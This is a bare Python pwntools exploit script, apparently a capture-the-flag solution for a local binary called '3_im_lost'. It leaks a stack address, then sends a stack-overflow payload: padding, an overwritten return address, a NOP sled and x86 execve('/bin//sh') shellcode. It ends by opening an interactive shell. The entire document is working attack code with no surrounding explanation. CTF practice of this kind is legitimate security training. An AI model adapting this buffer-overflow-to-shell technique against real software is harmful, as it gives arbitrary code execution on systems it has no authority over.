from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./3_im_lost"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("live at ")
stack_leak = int(p.recvline()[:-1], 16)
log.info(hex(stack_leak))

shellcode = asm('''
xor eax, eax
push eax

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov edx, ecx

mov eax, 0xb
int 0x80
''')

payload = b"A" * 20 + pack(stack_leak + 25) + b"\x90"*100 + shellcode
pause()
p.sendlineafter("/No", payload)

p.interactive()
